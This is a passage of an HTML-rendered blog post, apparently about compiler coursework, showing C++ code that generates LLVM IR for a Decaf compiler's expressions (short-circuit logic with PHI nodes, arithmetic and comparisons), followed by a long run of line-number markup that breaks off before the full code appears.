class="string">&quot;negtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == expbK)&#123;</span><br><span class="line">        llvm::Value *L;</span><br><span class="line">        llvm::Value *R;</span><br><span class="line">        list&lt;llvm::BasicBlock *&gt; BL;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;<span class="built_in">get_op</span>(Option) == ortmp)&#123;</span><br><span class="line">            llvm::BasicBlock* currentBlock = Builder.<span class="built_in">GetInsertBlock</span>(); </span><br><span class="line">            llvm::Function* currentFunction = currentBlock-&gt;<span class="built_in">getParent</span>();</span><br><span class="line">            </span><br><span class="line">            L = Exp1-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">            llvm::BasicBlock* OpValBB = llvm::BasicBlock::<span class="built_in">Create</span>(Context, <span class="string">&quot;noskct&quot;</span>,currentFunction);</span><br><span class="line">            llvm::BasicBlock* CurBB = llvm::BasicBlock::<span class="built_in">Create</span>(Context, <span class="string">&quot;skctend&quot;</span>,currentFunction);</span><br><span class="line">            Builder.<span class="built_in">CreateCondBr</span>(L,CurBB,OpValBB);</span><br><span class="line"></span><br><span class="line">            Builder.<span class="built_in">SetInsertPoint</span>(OpValBB);</span><br><span class="line">            R = Exp2-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateOr</span>(L, R, <span class="string">&quot;ortmp&quot;</span>);</span><br><span class="line">            Builder.<span class="built_in">CreateBr</span>(CurBB);</span><br><span class="line"></span><br><span class="line">            Builder.<span class="built_in">SetInsertPoint</span>(CurBB);</span><br><span class="line">            llvm::PHINode *val = Builder.<span class="built_in">CreatePHI</span>(L-&gt;<span class="built_in">getType</span>(), <span class="number">2</span>, <span class="string">&quot;phival&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (llvm::BasicBlock* Pred : llvm::<span class="built_in">predecessors</span>(CurBB)) &#123;</span><br><span class="line">                BL.<span class="built_in">push_front</span>(Pred);</span><br><span class="line">            &#125;</span><br><span class="line">            val-&gt;<span class="built_in">addIncoming</span>(L, BL.<span class="built_in">front</span>());</span><br><span class="line">            BL.<span class="built_in">pop_front</span>();</span><br><span class="line">            val-&gt;<span class="built_in">addIncoming</span>(<span class="keyword">this</span>-&gt;des.value, BL.<span class="built_in">front</span>());</span><br><span class="line">            BL.<span class="built_in">pop_front</span>();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = val;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;<span class="built_in">get_op</span>(Option) == andtmp)&#123;</span><br><span class="line">            llvm::BasicBlock* currentBlock = Builder.<span class="built_in">GetInsertBlock</span>(); </span><br><span class="line">            llvm::Function* currentFunction = currentBlock-&gt;<span class="built_in">getParent</span>();</span><br><span class="line"></span><br><span class="line">            L = Exp1-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">            llvm::BasicBlock* OpValBB = llvm::BasicBlock::<span class="built_in">Create</span>(Context, <span class="string">&quot;noskct&quot;</span>,currentFunction);</span><br><span class="line">            llvm::BasicBlock* CurBB = llvm::BasicBlock::<span class="built_in">Create</span>(Context, <span class="string">&quot;skctend&quot;</span>,currentFunction);</span><br><span class="line">            Builder.<span class="built_in">CreateCondBr</span>(L,OpValBB,CurBB);</span><br><span class="line"></span><br><span class="line">            Builder.<span class="built_in">SetInsertPoint</span>(OpValBB);</span><br><span class="line">            R = Exp2-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateAnd</span>(L, R, <span class="string">&quot;andtmp&quot;</span>);</span><br><span class="line">            Builder.<span class="built_in">CreateBr</span>(CurBB);</span><br><span class="line"></span><br><span class="line">            Builder.<span class="built_in">SetInsertPoint</span>(CurBB);</span><br><span class="line">            llvm::PHINode *val = Builder.<span class="built_in">CreatePHI</span>(L-&gt;<span class="built_in">getType</span>(), <span class="number">2</span>, <span class="string">&quot;phival&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (llvm::BasicBlock* Pred : llvm::<span class="built_in">predecessors</span>(CurBB)) &#123;</span><br><span class="line">                BL.<span class="built_in">push_front</span>(Pred);</span><br><span class="line">            &#125;</span><br><span class="line">            val-&gt;<span class="built_in">addIncoming</span>(L, BL.<span class="built_in">front</span>());</span><br><span class="line">            BL.<span class="built_in">pop_front</span>();</span><br><span class="line">            val-&gt;<span class="built_in">addIncoming</span>(<span class="keyword">this</span>-&gt;des.value, BL.<span class="built_in">front</span>());</span><br><span class="line">            BL.<span class="built_in">pop_front</span>();</span><br><span class="line">            <span class="keyword">this</span>-&gt;des.value = val;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            L = Exp1-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">            R = Exp2-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (L == <span class="number">0</span> || R == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (<span class="keyword">this</span>-&gt;<span class="built_in">get_op</span>(Option)) &#123;</span><br><span class="line">            <span class="keyword">case</span> addtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateAdd</span>(L, R, <span class="string">&quot;addtmp&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> subtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateSub</span>(L, R, <span class="string">&quot;subtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> multmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateMul</span>(L, R, <span class="string">&quot;multmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> modtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateSRem</span>(L, R, <span class="string">&quot;modtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> divtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateSDiv</span>(L, R, <span class="string">&quot;divtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> eqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateICmpEQ</span>(L, R, <span class="string">&quot;eqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> neqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateICmpNE</span>(L, R, <span class="string">&quot;neqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> slttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateICmpSLT</span>(L, R, <span class="string">&quot;lttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> gttmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateICmpSGT</span>(L, R, <span class="string">&quot;gttmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> sletmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateICmpSLE</span>(L, R, <span class="string">&quot;sletmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">            <span class="keyword">case</span> geqtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateICmpSGE</span>(L, R, <span class="string">&quot;geqtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> shltmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateShl</span>(L, R, <span class="string">&quot;shltmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>; </span><br><span class="line">            <span class="keyword">case</span> shrtmp:</span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = Builder.<span class="built_in">CreateLShr</span>(L, R, <span class="string">&quot;shrtmp&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;                          </span><br><span class="line">            <span class="keyword">default</span>: </span><br><span class="line">                <span class="keyword">this</span>-&gt;des.value = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;des.kind == funcK)&#123;</span><br><span class="line">        decafFunCall * call = (decafFunCall *)<span class="keyword">this</span>; </span><br><span class="line">        <span class="keyword">this</span>-&gt;des.value = call-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>-&gt;des.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来的工作和上一个实验无异，完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span 